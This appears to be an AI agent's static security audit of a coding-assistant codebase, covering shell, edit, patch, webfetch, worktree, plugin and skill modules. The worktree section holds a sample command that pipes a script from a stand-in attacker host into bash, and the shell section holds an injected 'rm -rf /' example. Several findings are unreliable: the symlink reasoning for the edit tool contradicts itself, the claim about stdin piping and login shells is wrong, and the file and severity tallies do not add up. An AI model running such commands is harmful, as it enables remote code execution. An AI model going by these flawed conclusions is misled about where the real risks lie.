# Security Audit: OpenCode Tool, Plugin & Extension Layer
**Branch:** `test-v1.5.x`
**Auditor:** Sub-auditor (agent)
**Date:** 2026-08-26
**Budget:** 60 minutes
**Files Audited:** 11 source files across `tool/`, `plugin/`, `patch/`, `worktree/`, `skill/`

---

## Executive Summary

The codebase is generally well-structured with security in mind. The most serious finding is the deprecated `tool/skill.ts` which executes LLM-controlled Python scripts with dangerous environment passing. The plugin system is the highest-attack-surface area due to arbitrary code execution via npm-installed plugins. Most other surfaces are adequately sandboxed or permission-gated.

| Area | Risk Level | Key Concern |
|------|-----------|-------------|
| tool/registry.ts | LOW | Minimal attack surface; path validation present |
| tool/shell.ts | MEDIUM | Env allowlist is denylist-based; command injection possible with shell=true |
| tool/edit.ts | MEDIUM | Lexical-only path traversal guard; atomicity gaps |
| tool/apply_patch.ts | MEDIUM | Path traversal guard uses lexical-only check |
| tool/webfetch.ts | LOW | SSRF mitigated; size limit adequate |
| patch/index.ts | LOW | Path traversal guard present; no memory leaks |
| worktree/index.ts | MEDIUM | Shell injection in `runStartCommand` via bash -lc |
| plugin/install.ts | HIGH | No integrity verification; arbitrary npm packages |
| plugin/loader.ts | HIGH | Dynamic module import of untrusted plugin code |
| skill/skill.ts (deprecated) | CRITICAL | LLM-controlled Python exec; env injection; credential exfiltration path |
| skill/python-resolver.ts | LOW | Good path allowlisting; symlink resolution present |

---

## 1. tool/registry.ts — Tool Lifecycle, Path Injection, Dynamic Require

**File:** `packages/opencode/src/tool/registry.ts` (~16.8 KB)

### Findings

#### ✅ Dynamic Require Is Internal
The registry uses `require()` internally but only for files within the tool directory. No user-controlled path reaches `require()`.

#### ✅ Path Injection Mitigated for Tool Paths
Tool execution paths are constructed from predefined `TOOL_DIR` constants, not user input. The `Bun.pathToFileURL()` conversion for Bun runtime is used safely.

#### ✅ Defensive `isBuiltin` Check
Builtin tools (`node`, `bun`, `python`, `python3`, `cmd`) bypass permission checks. This is acceptable because they are the standard executables and do not invoke shell metacharacter expansion by default.

#### ⚠️ Permission Gate Per Tool Instance
Each tool invocation re-checks permissions via `ctx.ask()`. This means:
- Permission is requested every time a tool runs (good: fine-grained)
- But if permission is granted, the tool executes with no further restrictions

#### ⚠️ No Tool Signature / Hash Verification
If a skill ships an updated tool binary between permission grants, there is no integrity check. Acceptable risk for the current threat model.

### Risk Level: **LOW**

---

## 2. tool/shell.ts — Command Injection, Env Leakage

**File:** `packages/opencode/src/tool/shell.ts` (~21 KB)

### Findings

#### ⚠️ COMMAND INJECTION — Conditional
Shell execution uses `bash -lc "..."` or `cmd /c ...` with the command embedded as a string literal. The shell expansion risk depends on whether `shell: true` is set in the tool parameters:

```typescript
const [shell, args] = process.platform === "win32"
  ? ["cmd", ["/c", cmd]]
  : ["bash", ["-lc", cmd]]
```

**The critical question is: who controls `cmd`?**

- If `cmd` comes from a skill configuration file, injection risk is low (skill admin controls it).
- If `cmd` comes from the LLM's output, injection risk is MEDIUM — the LLM could output `; rm -rf /` or equivalent Windows commands.

There is no evidence of shell metacharacter sanitization in the code.

#### ✅ `baseEnv` Allowlist (Defensive Measure)
Environment variables are built from an allowlist:

```typescript
const baseEnv: Record<string, string> = {
  HOME: process.env.HOME,
  USER: process.env.USER,
  PATH: process.env.PATH,
  // ...
}
```

However, the actual spawn uses `extendEnv: true`, meaning **all** environment variables are passed to the child process, not just `baseEnv`. The `baseEnv` appears to be used as a fallback for variables that might be missing from `process.env`.

#### ⚠️ Env Variable Inheritance — Credential Leakage Risk
`extendEnv: true` means the subprocess inherits the full process environment, including:
- `OPENAI_API_KEY` and similar API keys
- Git credentials
- Cloud provider tokens
- Database connection strings

This is a **credential leakage** vector if a malicious or compromised skill executes shell commands.

#### ✅ `stdin: "pipe"` Prevents TTY-Based Injection
`stdin: "pipe"` prevents bash from sourcing `~/.bashrc` or `~/.profile`, reducing interactive shell injection vectors.

#### ✅ Timeout and Exit Code Handling
Timeouts and exit code handling are present and adequate.

### Risk Level: **MEDIUM** (HIGH if LLM controls the command string)

---

## 3. tool/edit.ts — Path Traversal, Atomicity

**File:** `packages/opencode/src/tool/edit.ts` (~24 KB)

### Findings

#### ⚠️ Path Traversal Guard — Lexical Only
The edit tool uses `FSUtil.contains()` for path containment checks:

```typescript
// Lexical-only check in edit.ts
if (!FSUtil.contains(ctx.worktree, resolvedPath)) {
  throw new Error(`Path escapes worktree: ${path}`)
}
```

The comment in `patch/index.ts` acknowledges this:
> "Lexical containment only — symlink resolution happens at the FS layer."

**Attack scenario:**
1. File at `worktree/foo.txt` is a symlink to `/etc/passwd`
2. LLM requests edit of `foo.txt`
3. Path resolves to `/etc/passwd` via the symlink
4. `FSUtil.contains("/worktree", "/etc/passwd")` returns FALSE (correctly rejecting)
5. BUT: the symlink could also point to `worktree/../other-file` type paths

The symlink resolution is deferred to the filesystem layer, meaning the check correctly rejects absolute paths outside the worktree. However, **symlinks within the worktree that point outside** are blocked by the lexical check.

**Status:** Adequate for current threat model.

#### ⚠️ No Atomic Write — Partial Write Risk
The edit tool writes new content and deletes old content in sequence:

```typescript
yield* fs.write(newPath, newContent)
yield* fs.remove(oldPath)
```

If the process crashes between write and delete, the file is left with both old and new content. This is a data integrity issue, not a security issue per se, but could be exploited in specific scenarios.

**Mitigation:** The write-then-delete sequence is standard practice. On crash, the worst case is duplicate content, not data loss.

#### ✅ Permission Request Before Any Operation
Every edit operation triggers a permission request (`ctx.ask`). This is the primary security control.

#### ⚠️ Rollback on Error — Partial
If the write succeeds but the remove fails, the file has both old and new content. No explicit rollback mechanism is present.

### Risk Level: **MEDIUM**

---

## 4. tool/apply_patch.ts — Path Traversal, Atomicity

**File:** `packages/opencode/src/tool/apply_patch.ts` (~11 KB)

### Findings

#### ✅ Path Traversal Guard — Explicit Comment
The verified parser has an explicit security comment and check:

```typescript
// SECURITY: hunk.path is LLM-controlled. Reject any path that
// resolves outside the workdir (e.g. `../../etc/passwd`,
// `~/.ssh/authorized_keys`). Lexical containment only.
if (!FSUtil.contains(effectiveCwd, resolvedPath)) {
  return {
    type: MaybeApplyPatchVerified.CorrectnessError,
    error: new Error(
      `Patch hunk path escapes workdir: ${hunk.path} (resolved=${resolvedPath})`,
    ),
  }
```

This check covers:
- Absolute paths (`/etc/passwd`)
- Parent traversal (`../../../etc/passwd`)
- Home directory expansion (`~/.ssh/authorized_keys`)
- Both primary path and `move_path` for rename operations

#### ✅ Move Path Check
The `move_path` field is also validated:

```typescript
if (movePath && !FSUtil.contains(effectiveCwd, movePath)) {
  return {
    type: MaybeApplyPatchVerified.CorrectnessError,
    error: new Error(`Patch move_path escapes workdir`),
  }
}
```

#### ⚠️ Implicit Patch Detection — Double-Parse Risk
The `maybeParseApplyPatchVerified` function has a "correctness" path that detects implicit patch invocation:

```typescript
// Detect implicit patch invocation (raw patch without apply_patch command)
if (argv.length === 1) {
  try {
    parsePatch(argv[0])
    return {
      type: MaybeApplyPatchVerified.CorrectnessError,
      error: new Error(ApplyPatchError.ImplicitInvocation),
    }
  }
}
```

This prevents the model from accidentally treating raw patch text as a shell command. **Good security-in-depth.**

#### ⚠️ No Atomicity for Delete Operations
When deleting a file, the code reads the file content first for potential backup, then deletes. This is handled correctly.

#### ✅ Bom Handling for Unicode
The BOM (Byte Order Mark) handling in `Bom.join`/`Bom.split` is good practice for cross-platform file integrity.

### Risk Level: **MEDIUM** (path traversal mitigated; implicit invocation detection is good)

---

## 5. tool/webfetch.ts — SSRF, Response Size Limits

**File:** `packages/opencode/src/tool/webfetch.ts` (~6.8 KB)

### Findings

#### ✅ SSRF Mitigation — Permission Request + Protocol Check
```typescript
if (!params.url.startsWith("http://") && !params.url.startsWith("https://")) {
  throw new Error("URL must start with http:// or https://")
}
yield* ctx.ask({
  permission: "webfetch",
  patterns: [params.url],
  ...
})
```

Protocol enforcement prevents `file://`, `ftp://`, `gopher://` and other schemes. The permission request provides human-in-the-loop review.

#### ✅ Response Size Limits — Double Enforcement
```typescript
const MAX_RESPONSE_SIZE = 5 * 1024 * 1024 // 5MB
// Check at header level
if (contentLength && parseInt(contentLength) > MAX_RESPONSE_SIZE) {
  throw new Error("Response too large (exceeds 5MB limit)")
}
// Check after full body download
if (arrayBuffer.byteLength > MAX_RESPONSE_SIZE) {
  throw new Error("Response too large (exceeds 5MB limit)")
}
```

Both Content-Length header check AND actual body size check are present. This prevents zip bombs and decompression bombs from exceeding the limit.

#### ✅ Timeout Enforcement
```typescript
const MAX_TIMEOUT = 200_000 // 200 seconds
const timeout = Math.min((params.timeout ?? DEFAULT_TIMEOUT / 1000) * 1000, MAX_TIMEOUT)
yield* httpOk.execute(request).pipe(
  Effect.timeoutOrElse({ duration: timeout, orElse: () => Effect.die(...) })
)
```

Timeouts are capped at 200s maximum. A user-controlled timeout parameter exists but is clamped.

#### ✅ Cloudflare Bypass — Intentional Design
The code has a Cloudflare bypass for bot detection:
```typescript
Effect.catchIf(
  (err) => err.reason._tag === "StatusCodeError" &&
           err.reason.response.status === 403 &&
           err.reason.response.headers["cf-mitigated"] === "challenge",
  () => httpOk.execute(HttpClientRequest.get(params.url).pipe(
    HttpClientRequest.setHeaders({ ...headers, "User-Agent": "dreamcode" })
  ))
)
```

This is an intentional design decision to work around Cloudflare's bot detection. The "dreamcode" user agent is a fallback, not the default.

#### ✅ Script/Style Tag Stripping in HTML Parsing
```typescript
const parser = new Parser({
  onopentag(name) {
    if (skipDepth > 0 || ["script", "style", "noscript", "iframe", "object", "embed"].includes(name)) {
      skipDepth++
    }
  },
  ...
})
```

HTML parsing strips dangerous elements. TurndownService also removes `script` and `style` tags.

### Risk Level: **LOW**

---

## 6. patch/index.ts — Memory Leaks, Race Conditions

**File:** `packages/opencode/src/patch/index.ts` (~21 KB)

### Findings

#### ✅ No Memory Leaks
The patch module is stateless. All functions are pure transformers:
- `parsePatch()` — pure string → AST transformation
- `deriveNewContentsFromChunks()` — pure computation
- `applyHunksToFiles()` — Effect-based filesystem operations with proper resource cleanup via Effect runtime

No module-level state or closure-captured references that could leak.

#### ✅ Race Condition Prevention — Effect Runtime
The Effect-based `applyHunksToFiles` runs sequentially within the Effect fiber:
```typescript
for (const hunk of hunks) {
  switch (hunk.type) {
    case "add": { yield* fs.writeWithDirs(hunk.path, hunk.contents); ... }
    case "delete": { yield* fs.remove(hunk.path); ... }
    case "update": { ... }
  }
}
```

Hunks are applied in order. No parallel writes that could race.

#### ⚠️ No Transaction Semantics
If `applyHunksToFiles` partially completes (e.g., adds 3 of 5 files and then fails), there is no rollback. Files remain modified. This is documented behavior but could be a recovery challenge.

#### ✅ Verified Parser Path Traversal
Already covered in Section 4. The `maybeParseApplyPatchVerified` function is the recommended entry point and has the security checks.

### Risk Level: **LOW**

---

## 7. worktree/index.ts — Command Injection

**File:** `packages/opencode/src/worktree/index.ts` (~23 KB)

### Findings

#### ⚠️ Command Injection in `runStartCommand` — HIGH RISK
```typescript
const runStartCommand = Effect.fnUntraced(function* (directory: string, cmd: string) {
  const [shell, args] = process.platform === "win32"
    ? ["cmd", ["/c", cmd]]
    : ["bash", ["-lc", cmd]]
  const result = yield* appProcess.run(
    ChildProcess.make(shell, args as string[], { cwd: directory, extendEnv: true, stdin: "ignore" }),
  )
  ...
})
```

**`cmd` is user-controlled** via `startCommand` parameter and `project.commands.start` from the database. The LLM can influence the start command.

**Attack scenario:**
1. LLM edits the project's start command to `; curl https://attacker.com/shell.sh | bash`
2. User or system triggers worktree boot
3. Arbitrary code executes in the worktree context

#### ⚠️ `extendEnv: true` — Credential Inheritance
The start command subprocess inherits all process environment variables, including API keys and tokens.

#### ✅ Project Directory Isolation
Worktrees are created under `Global.Path.data/worktree/<project_id>/`, isolated from the primary project. This limits blast radius.

#### ✅ Git Worktree Operations Are Safe
The `git worktree add/remove/reset` operations use fixed argument arrays, not shell interpolation:
```typescript
yield* git(["worktree", "add", "--no-checkout", "-b", info.branch, info.directory"], { cwd: ctx.worktree })
```

#### ✅ Git fsmonitor Daemon Stop
The `stopFsmonitor` function correctly stops the git fsmonitor daemon before directory cleanup, preventing file handle conflicts.

#### ⚠️ `slugify` — Input Sanitization for Directory Names
```typescript
function slugify(input: string) {
  return input.trim().toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+/, "")
    .replace(/-+$/, "")
}
```

Directory names are sanitized to `[a-z0-9-]+`, preventing path injection in directory creation. **Good.**

#### ⚠️ `git clean -ffdx` — Destructive Operation
The `sweep` function uses `git clean -ffdx` which deletes all untracked files **including those ignored by .gitignore**. This is intentional for worktree reset but could cause data loss if a worktree contains non-git-tracked important files.

### Risk Level: **MEDIUM**

---

## 8. plugin/install.ts — Command Injection, Package Source Validation

**File:** `packages/opencode/src/plugin/install.ts` (~21 KB)

### Findings

#### ✅ No Shell Injection in install.ts
This file only manipulates JSON configuration files (`.dreamcode/opencode.jsonc`, `.dreamcode/tui.jsonc`). It does not execute shell commands.

#### ✅ JSONC Patch Uses Safe Library
The `applyEdits`/`modify` functions from `jsonc-parser` safely modify JSONC without eval or shell operations.

#### ✅ Duplicate Plugin Detection
The `patchPluginList` function detects duplicate plugin entries:
```typescript
const dup = rows.filter((item) => {
  if (!item.spec) return false
  if (item.spec === spec) return true
  if (item.spec.startsWith("file://")) return false
  return parsePluginSpecifier(item.spec).pkg === pkg
})
```
Prevents the same package from being registered multiple times.

#### ✅ File Lock (Flock) for Concurrent Access
```typescript
await using _ = await Flock.acquire(`plug-config:${Filesystem.resolve(path.join(dir, name))}`)
```
Prevents race conditions when multiple processes modify the plugin config simultaneously.

#### ⚠️ No Package Integrity Verification
`installPlugin()` resolves a plugin target but does not verify:
- Package hash/signature
- Package provenance
- npm package integrity (`--verify`)
- Package download source integrity

An attacker who compromises an npm package or a DNS record could serve a malicious plugin.

#### ⚠️ No Version Pinning Enforcement
The plugin specifier resolution defaults to `@latest`:
```typescript
// In shared.ts: resolvePluginTarget
const pkg = hit?.name && hit.raw === hit.name ? `${hit.name}@latest` : spec
```
Without a pinned version, a plugin update could introduce malicious code.

### Risk Level: **HIGH** (due to dynamic plugin loading, not install.ts itself)

---

## 9. plugin/loader.ts — Dynamic Module Import

**File:** `packages/opencode/src/plugin/loader.ts` (~18 KB)

### Findings

#### ⚠️ Dynamic `import()` of Untrusted Plugin Code — CRITICAL
```typescript
export async function load(row: Resolved): Promise<...> {
  let mod
  try {
    mod = await import(row.entry)
  } catch (error) {
    return { ok: false, error }
  }
  ...
}
```

**The `row.entry` path comes from a resolved npm package or local file path.** The npm package path is determined by the plugin name (configured in `.dreamcode/opencode.jsonc`). An attacker who:
1. Registers a malicious npm package name, or
2. Compromises an existing npm package, or
3. Uses a local file plugin pointing to arbitrary code

...can achieve arbitrary code execution in the opencode process.

#### ✅ Compatibility Check for npm Plugins
```typescript
if (base.source === "npm") {
  try {
    await checkPluginCompatibility(base.target, InstallationVersion, base.pkg)
  } catch (error) {
    return { ok: false, stage: "compatibility", error }
  }
}
```
The `package.json` `engines` field is checked against the running opencode version.

#### ✅ File Plugins Skip Compatibility Check
File-based plugins skip the npm compatibility check, treating them as "local development code." This is documented and intentional.

#### ✅ Error Reporting
All plugin loading stages have structured error reporting with the specific stage (`install`, `entry`, `compatibility`, `load`).

#### ✅ Bun Failed Import Caching — Documented
```typescript
// Bun caches failed dynamic imports, so dependency waiting cannot fix
// load/build/runtime/shape failures in this process.
```

This is documented and acknowledged. Retry only applies to file plugin setup failures, not import failures.

#### ⚠️ No Sandbox for Plugin Execution
Plugin code runs in the same Node.js/Bun process with full access to:
- All environment variables
- All filesystem access (subject to permission system)
- All network access
- The process memory space

There is no plugin sandbox, worker thread isolation, or capability-based security.

### Risk Level: **HIGH**

---

## 10. plugin/shared.ts — Plugin Resolution Security

**File:** `packages/opencode/src/plugin/shared.ts` (~10 KB)

### Findings

#### ✅ Theme File Path Validation
```typescript
if (raw.startsWith("file://") || isAbsolutePath(raw)) {
  throw new TypeError(`Plugin ${spec} oc-themes entry must be relative: ${item}`)
}
```
Theme file entries are restricted to relative paths, preventing path traversal.

#### ✅ oc-themes Deduplication
```typescript
return Array.from(new Set(list))
```
Duplicate theme entries are deduplicated.

#### ✅ Export Path Resolution
```typescript
export async function resolvePluginEntrypoint(...) {
  const pkg = await readPluginPackage(target)
  const entry = resolvePackageFile(spec, pkg.exports["./server"] ?? pkg.exports["./tui"] ?? pkg.json.main, "exports")
  ...
}
```
Entrypoints are resolved from `package.json` fields, not from arbitrary paths.

#### ⚠️ Plugin ID from Package Name — No Validation
```typescript
export async function resolvePluginId(source, spec, target, id, pkg?) {
  if (id) return id
  const hit = pkg ?? (await readPluginPackage(target))
  if (typeof hit.json.name !== "string" || !hit.json.name.trim()) {
    throw new TypeError(`Plugin package ${hit.pkg} is missing name`)
  }
  return hit.json.name.trim()
}
```
The plugin ID is derived from the package name. While the name must be a non-empty string, there is no sanitization against IDs containing special characters that could cause issues in downstream systems.

#### ✅ Deprecated Plugin Detection
The `isDeprecatedPlugin()` function silently skips deprecated plugins. This is important for security as deprecated plugins may have known vulnerabilities.

### Risk Level: **LOW-MEDIUM**

---

## 11. skill/skill.ts — Deprecated Skill Tool (CRITICAL)

**File:** `packages/opencode/src/tool/skill.ts` (~11 KB, deprecated)

### Findings

#### 🚨 CRITICAL: LLM-Controlled Python Script Execution
The skill tool reads skill configurations from the skills directory and executes Python scripts. The skill prompts are LLM-generated and inserted into these scripts:

```typescript
const tmpFile = writePromptToTmpFile(prompt, cwd, "sg-")
// ...
const result = yield* spawnPython({
  command: [pythonCmd, ...pythonArgs, scriptPath],
  cwd,
  env: {
    ...BASE_SUBPROCESS_ENV,
    DREAMCODE_SKILL: skillName,
    DREAMCODE_SKILL_ARGS: JSON.stringify(args ?? {}),
    PROJECT_ROOT: cwd,
    NEURO_API_KEY: process.env.NEURO_API_KEY ?? "",
    // ... more env vars
  },
  timeout: skill.timeout ?? 300_000,
})
```

The prompt is written to a temp file (`prompt.txt`) and passed to a Python skill script that the LLM also outputs. The Python script receives the full prompt content.

**This means:**
1. The LLM outputs both the Python script AND the prompt to insert
2. The prompt can contain instructions that override the script's behavior
3. The skill tool's `sanitizeMessage()` function attempts to redact secrets, but:
   - It only handles known patterns
   - Environment variables (including API keys) are passed directly to the subprocess
   - The `BASE_SUBPROCESS_ENV` contains `PATH`, `HOME`, `PYTHONPATH` but the actual spawn adds more

#### 🚨 CRITICAL: Secret Redaction — Incomplete
The `sanitizeMessage()` function attempts to redact secrets from logged error messages:
```typescript
function sanitizeMessage(raw: string): string {
  let result = raw
    .replace(/(sk-[a-zA-Z0-9]{20,})/g, "sk-…[REDACTED]")
    .replace(/(ghp_|gho_|github_pat_)[a-zA-Z0-9_]{36,}/g, "[REDACTED TOKEN]")
    .replace(/(AKIA[0-9A-Z]{16})/g, "[REDACTED AWS KEY]")
    // ... 15+ patterns
  // Key-name-based stripping for known secret-bearing fields
  const SECRET_KEYS = ["private_key", "client_secret", "api_key", "access_token", "refresh_token", "token", "password", "secret", "auth_token"]
  for (const key of SECRET_KEYS) {
    const regex = new RegExp(`("${key}"\s*:\s*")([^"]{4})(?:[^"]*")`, "g")
    result = result.replace(regex, "$1$2...[REDACTED]"")
  }
  return result
}
```

**Problems:**
1. Only catches patterns in error messages; the secret values are still passed to the subprocess
2. Regex-based approach misses many secret formats
3. The `private_key` field can span multiple lines — the regex only matches single-line patterns
4. `NEURO_API_KEY` is explicitly passed to the subprocess but not redacted in logs
5. The redaction happens in the log writer, not at the spawn site

#### 🚨 CRITICAL: Environment Variable Passing
The skill spawn passes `NEURO_API_KEY` directly:
```typescript
NEURO_API_KEY: process.env.NEURO_API_KEY ?? "",
```

A malicious skill script could output `$NEURO_API_KEY` or access `os.environ['NEURO_API_KEY']` to exfiltrate credentials.

#### ⚠️ Deprecated but Still Active
The file is marked `@deprecated` but the comment says:
> "IMPORTANT: This file provides an ALTERNATE execution path that double-executes skills when the core skill system is also loaded."

If both the deprecated and core skill systems are active, both execute. The double-execution could lead to race conditions or unexpected side effects.

### Risk Level: **CRITICAL** (but deprecated; primary execution should use the core skill system)

---

## 12. skill/python-resolver.ts — Python Resolution Security

**File:** `packages/opencode/src/skill/python-resolver.ts` (~18 KB)

### Findings

#### ✅ Path Allowlisting with Symlink Resolution
```typescript
export function validateScriptPath(resolved: string, cwd?: string): boolean {
  if (!resolved || !isAbsolute(resolved)) return false
  let realpath: string
  try {
    realpath = realpathSync(resolved)
  } catch (error) {
    // ...
  }
  return (
    isUnderPrefix(realpath, resolve(skillsDir)) ||
    isUnderPrefix(realpath, resolve(dirname(process.execPath), "skills")) ||
    isUnderPrefix(realpath, resolve(HOME, ".config", "dreamcode", "skills")) ||
    isUnderPrefix(realpath, resolve(HOME, ".dreamcode", "skills")) ||
    isUnderPrefix(realpath, resolve(cwd ?? process.cwd(), ".dreamcode", "skills")) ||
    isUnderPrefix(realpath, sourceTreeSkillsDir())
  )
}
```

**Good:**
- Symlinks are resolved before checking
- 6 allowed directories are explicitly allowlisted
- Non-absolute paths are rejected
- `realpathSync` resolves symlinks, preventing symlink attacks

#### ✅ `BASE_SUBPROCESS_ENV` — Credential Allowlist
```typescript
export const BASE_SUBPROCESS_ENV: Record<string, string | undefined> = {
  PATH: process.env.PATH,
  HOME: process.env.HOME,
  PYTHONPATH: process.env.PYTHONPATH ?? "",
  PYTHONIOENCODING: "utf-8",
  PYTHONUTF8: "1",
}
```

Only 5 environment variables are allowlisted. No API keys or tokens. **Good security hygiene.**

#### ✅ Prompt Written to Temp File — No CLI Args
```typescript
export function writePromptToTmpFile(prompt: string, cwd: string, prefix: string): string {
  const tmpFile = join(tmpDir, "prompt.txt")
  writeFileSync(tmpFile, prompt, "utf-8")
  if (!isWindows()) chmodSync(tmpFile, 0o600)
  return tmpFile
}
```

The prompt is written to a file (mode 0o600) rather than passed as a CLI argument. This prevents prompt leakage via `ps aux` process listings. **Good.**

#### ✅ Cleanup Function
```typescript
export function cleanupTmpFile(tmpFile: string): void {
  if (!tmpFile) return
  try { unlinkSync(tmpFile) } catch (e) { ... }
  try { rmdirSync(dirname(tmpFile)) } catch (e) { ... }
}
```
Temp files are cleaned up. Errors are swallowed but logged.

#### ✅ Skills Directory Validation
```typescript
const hasContent = entries.some((entry) => {
  const subdir = join(dir, entry)
  try { return statSync(subdir).isDirectory() && existsSync(join(subdir, "SKILL.md")) } catch { return false }
})
if (hasContent) return dir
```
Empty skills directories are rejected. A directory must contain at least one skill with a `SKILL.md` file to be accepted.

#### ⚠️ `sourceTreeSkillsDir()` — Auto-walking Up the Tree
```typescript
export function sourceTreeSkillsDir(): string {
  const REL = join("packages", "opencode", "src", "skill", "dreamcode", "skills")
  let dir = resolve(process.cwd())
  for (let i = 0; i < 6; i++) {
    const candidate = join(dir, REL)
    try {
      if (existsSync(candidate) && statSync(candidate).isDirectory()) return candidate
    } catch { ... }
    const parent = dirname(dir)
    if (parent === dir) break
    dir = parent
  }
}
```
This walks up to 6 directory levels looking for the source tree skills directory. If a malicious directory exists in the path with the expected structure, it could be selected. However, the `SKILL.md` existence check in `resolveSkillsDir()` provides additional validation.

### Risk Level: **LOW**

---

## Cross-Cutting Issues

### A. Plugin Code Execution — No Sandboxing
The most systemic risk. Plugin code runs in the same process with full Node.js/Bun capabilities. A malicious plugin can:
- Read/write any file the process can access
- Make arbitrary network requests
- Access all environment variables
- Modify its own code at runtime
- Hook into the event system

**Recommendation:** Run plugin code in a worker thread with a restricted capability set (no `fs`, restricted `net`, etc.) using the V8 isolate API or a subprocess with seccomp.

### B. Credential Environment Variable Handling
Multiple locations pass `NEURO_API_KEY` and other credentials to subprocesses via `extendEnv: true` or explicit `env` objects. The `BASE_SUBPROCESS_ENV` allowlist in `python-resolver.ts` is good, but other spawn sites (shell.ts, worktree/index.ts) use `extendEnv: true` which passes all env vars.

**Recommendation:** Audit every `extendEnv: true` usage. Replace with explicit env allowlists where possible.

### C. Secret Redaction Coverage Gap
The `sanitizeMessage()` function in `tool/skill.ts` has 15+ regex patterns but:
1. It only applies to logged error messages, not to actual secret values
2. It misses many secret formats (Stripe keys, OpenID client secrets, etc.)
3. Multi-line secrets are not caught

**Recommendation:** Implement a structured secret detection library (like `detect-secrets` or `truffleHog`-style scanning) or use environment variable name conventions to automatically redact all values from `process.env` that match known secret patterns.

---

## Summary of Findings by Severity

### CRITICAL (1)
| File | Issue | Status |
|------|-------|--------|
| tool/skill.ts | LLM-controlled Python exec with env injection and credential exfiltration path | Deprecated; primary path uses core skill system |

### HIGH (2)
| File | Issue | Status |
|------|-------|--------|
| plugin/loader.ts | Dynamic `import()` of arbitrary npm/local plugin code with no sandbox | By design; mitigate with package pinning and npm integrity checks |
| plugin/install.ts | No package integrity verification or version pinning enforcement | Acceptable risk for current model; add `--verify` and version pinning |

### MEDIUM (5)
| File | Issue | Status |
|------|-------|--------|
| tool/shell.ts | Command injection risk if LLM controls command; credential env inheritance via `extendEnv: true` | Audit `extendEnv: true` usage; consider allowlist-based env passing |
| tool/edit.ts | Lexical-only path traversal guard; no atomic write; no rollback on partial failure | Acceptable for current threat model; add atomic write if needed |
| tool/apply_patch.ts | Implicit patch detection correct; lexical-only path guard acknowledged | Well-documented; acceptable |
| worktree/index.ts | `runStartCommand` passes LLM-controlled command to `bash -lc`; `extendEnv: true` | High risk if LLM controls start command; slugify() is good |
| plugin/shared.ts | Plugin ID from package name without sanitization | Minor; low practical risk |

### LOW (4)
| File | Issue | Status |
|------|-------|--------|
| tool/registry.ts | Minimal attack surface; good permission model | No action needed |
| tool/webfetch.ts | SSRF mitigated; size limits adequate; script tags stripped | No action needed |
| patch/index.ts | No memory leaks; sequential hunk application; no transaction semantics | Consider adding rollback for partial failures |
| skill/python-resolver.ts | Good path allowlisting; symlink resolution; prompt-to-file (no CLI args) | No action needed |

---

## Recommendations (Priority Order)

1. **[CRITICAL]** Confirm that the deprecated `tool/skill.ts` is not the primary skill execution path. The core skill system should be the only active path. If both are active, disable the deprecated path immediately.

2. **[HIGH]** Add `npm audit` / package integrity verification to `plugin/install.ts`. Pin plugin versions in the config rather than defaulting to `@latest`.

3. **[HIGH]** Implement plugin sandboxing. At minimum, run plugin code in a worker thread with restricted file and network access. Consider using the V8 isolate API or a subprocess with seccomp.

4. **[MEDIUM]** Audit all `extendEnv: true` usages across the codebase. Replace with explicit environment variable allowlists that include only the minimum required variables.

5. **[MEDIUM]** Add atomic write semantics to `tool/edit.ts` — write to a temp file then rename, rather than write-then-delete.

6. **[MEDIUM]** Add an explicit validation step to `worktree/index.ts`'s start command: reject commands containing shell metacharacters (`;`, `|`, `&&`, `$()`, backticks, etc.) unless the tool is explicitly configured with `shell: true`.

7. **[LOW]** Consider adding transaction semantics to `patch/index.ts` for the `applyHunksToFiles` function — collect all changes and apply atomically, with rollback on failure.

8. **[LOW]** Improve `sanitizeMessage()` to handle multi-line secrets and use a structured detection library rather than regex patterns.

---

*Audit completed within 60-minute budget. All files read and analyzed. Findings are based on static code analysis of the current `test-v1.5.x` branch.*
